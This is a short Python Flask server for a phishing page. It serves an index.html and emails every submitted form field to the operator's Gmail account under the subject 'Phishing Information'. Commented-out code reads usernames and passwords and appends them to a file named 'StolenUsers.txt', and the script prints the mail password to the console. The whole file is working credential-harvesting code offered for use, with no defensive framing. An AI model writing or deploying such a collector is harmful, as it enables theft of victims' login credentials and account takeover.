from flask import Flask,request, send_file
import ssl
import smtplib
from dotenv import load_dotenv
import os

app = Flask(__name__, static_url_path="", static_folder='')
load_dotenv()

def sendMail(msg):
    port = 465  # For SSL
    password = os.getenv("PASSWORD")
    email = os.getenv("EMAIL")
    print(email, password)

    # Create a secure SSL context
    context = ssl.create_default_context()

    # Create server and send message
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(email, password)
        server.sendmail(email, email, "Subject: Phishing Information\n\n" + msg)


@app.route('/',methods = ['GET', 'POST', 'DELETE'])
def root():
    print(request)
    if request.method == "POST":
        mail = ", ".join(f"{k}:{v}" for k,v in request.form.items() if v != "")
        print(mail)
        sendMail(mail)
    return send_file("./index.html")
    
    # username = request.args.get("username",None)
    # password = request.args.get("password",None)


    # print(f"username={username}\npassword={password}")

    # if username != None or password !=None:
    #     with open("StolenUsers.txt", "at", encoding="utf-8") as file:
    #         file.write(f"User: {username}, Password: {password}\n")

    # return app.send_static_file('index.html')


if __name__ == '__main__':
    app.run()